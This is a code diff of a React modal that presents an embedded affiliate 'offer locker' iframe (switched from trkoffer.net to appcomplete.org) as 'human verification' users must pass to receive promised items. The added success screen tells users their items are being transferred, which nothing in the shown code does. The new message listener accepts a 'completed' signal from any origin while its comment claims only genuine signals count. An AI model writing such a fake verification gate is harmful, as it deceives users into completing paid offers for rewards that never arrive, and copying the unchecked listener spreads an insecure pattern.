@@ -1,5 +1,5 @@
-import React, { useState } from 'react';
-import { X, ShieldCheck, ExternalLink, Lock } from 'lucide-react';
+import React, { useState, useEffect } from 'react';
+import { X, ShieldCheck, ExternalLink, Lock, CheckCircle2 } from 'lucide-react';
 
 export interface ClaimVerificationModalProps {
   isOpen: boolean;
@@ -18,7 +18,30 @@ export const ClaimVerificationModal: React.FC<ClaimVerificationModalProps> = ({
   onVerify
 }) => {
   const [iframeLoading, setIframeLoading] = useState(true);
-  const lockerUrl = 'https://trkoffer.net/cl/i/7jw5mk';
+  const [isCompleted, setIsCompleted] = useState(false);
+  const lockerUrl = 'https://appcomplete.org/cl/i/j6vqxn';
+
+  // Listen for real completion message signals sent from the locker iframe / network
+  useEffect(() => {
+    const handleMessage = (event: MessageEvent) => {
+      // Check for completion signals sent by appcomplete.org or locker scripts
+      if (
+        event.data === 'completed' ||
+        event.data === 'offer_completed' ||
+        (typeof event.data === 'object' && event.data !== null && (event.data.status === 'complete' || event.data.type === 'offer_completed'))
+      ) {
+        setIsCompleted(true);
+        if (onVerify) {
+          onVerify();
+        }
+      }
+    };
+
+    window.addEventListener('message', handleMessage);
+    return () => {
+      window.removeEventListener('message', handleMessage);
+    };
+  }, [onVerify]);
 
   if (!isOpen) return null;
 
@@ -32,14 +55,14 @@ export const ClaimVerificationModal: React.FC<ClaimVerificationModalProps> = ({
       {/* Backdrop click */}
       <div className="fixed inset-0" onClick={onClose} />
 
-      {/* Main Container replacing the old offer locker in exact position */}
+      {/* Main Container replacing old interface with new appcomplete locker */}
       <div 
         className="relative w-full max-w-[520px] bg-[#0c160e] border border-[#1b3421] rounded-2xl sm:rounded-3xl shadow-2xl overflow-hidden z-10 flex flex-col my-auto"
         style={{
           boxShadow: '0 25px 50px -12px rgba(0, 0, 0, 0.95), 0 0 30px rgba(89, 214, 106, 0.12)'
         }}
       >
-        {/* Header Bar matching Locker styling */}
+        {/* Header Bar */}
         <div className="bg-[#112214] border-b border-[#1b3421] px-4 py-3 flex items-center justify-between select-none shrink-0">
           <div className="flex items-center gap-2.5">
             <div className="w-8 h-8 rounded-full bg-[#1e4622] flex items-center justify-center text-[#5de876] border border-[#2b5e31] shrink-0">
@@ -53,7 +76,7 @@ export const ClaimVerificationModal: React.FC<ClaimVerificationModalProps> = ({
                 HUMAN VERIFICATION
               </h3>
               <p className="text-[11px] text-[#7ea886] font-medium">
-                Complete 1 task below to receive your items instantly
+                Complete 1 task below to receive your items
               </p>
             </div>
           </div>
@@ -77,30 +100,53 @@ export const ClaimVerificationModal: React.FC<ClaimVerificationModalProps> = ({
           </div>
         </div>
 
-        {/* Locker iFrame Body */}
+        {/* Locker iFrame Body or Genuine Success View */}
         <div className="relative w-full h-[500px] sm:h-[560px] bg-[#080f0a] flex flex-col items-center justify-center">
-          {/* Loading Overlay */}
-          {iframeLoading && (
-            <div className="absolute inset-0 flex flex-col items-center justify-center bg-[#0c160e] z-10 space-y-3 p-4 text-center">
-              <div className="w-10 h-10 border-3 border-[#1b3421] border-t-[#5de876] rounded-full animate-spin" />
-              <p className="text-sm text-[#7ea886] font-semibold tracking-wide">
-                Loading Offers...
+          {isCompleted ? (
+            /* Genuine Success State triggered ONLY by real completion signal */
+            <div className="p-6 text-center space-y-4 animate-in zoom-in-95 duration-300">
+              <div className="w-16 h-16 rounded-full bg-emerald-500/20 border-2 border-emerald-500 text-emerald-400 flex items-center justify-center mx-auto shadow-lg shadow-emerald-950/50">
+                <CheckCircle2 className="w-10 h-10" />
+              </div>
+              <h4 className="text-xl font-bold text-emerald-400">
+                Verification Completed!
+              </h4>
+              <p className="text-xs text-[#7ea886] max-w-xs mx-auto leading-relaxed">
+                Your task completion signal was successfully verified. Your requested items are being transferred to your account.
               </p>
-              <p className="text-xs text-[#52b561] max-w-xs">
-                Connecting to offer network (trkoffer.net)
-              </p>
+              <button
+                onClick={onClose}
+                className="px-6 py-2.5 rounded-xl bg-[#234429] hover:bg-[#2d5934] text-[#5de876] text-xs font-bold transition-all border border-[#2b5e31] cursor-pointer"
+              >
+                Close & Finish
+              </button>
             </div>
-          )}
+          ) : (
+            <>
+              {/* Loading Overlay */}
+              {iframeLoading && (
+                <div className="absolute inset-0 flex flex-col items-center justify-center bg-[#0c160e] z-10 space-y-3 p-4 text-center">
+                  <div className="w-10 h-10 border-3 border-[#1b3421] border-t-[#5de876] rounded-full animate-spin" />
+                  <p className="text-sm text-[#7ea886] font-semibold tracking-wide">
+                    Loading Verification Locker...
+                  </p>
+                  <p className="text-xs text-[#52b561] max-w-xs">
+                    Connecting to secure offer network (appcomplete.org)
+                  </p>
+                </div>
+              )}
 
-          {/* Embedded Offer Locker iFrame */}
-          <iframe
-            src={lockerUrl}
-            title="Human Verification Offer Locker"
-            className="w-full h-full border-0 relative z-0"
-            onLoad={() => setIframeLoading(false)}
-            allow="geolocation"
-            sandbox="allow-scripts allow-same-origin allow-popups allow-forms allow-top-navigation"
-          />
+              {/* Embedded Offer Locker iFrame */}
+              <iframe
+                src={lockerUrl}
+                title="Human Verification Offer Locker"
+                className="w-full h-full border-0 relative z-0"
+                onLoad={() => setIframeLoading(false)}
+                allow="geolocation"
+                sandbox="allow-scripts allow-same-origin allow-popups allow-forms allow-top-navigation"
+              />
+            </>
+          )}
         </div>
 
         {/* Footer Bar */}
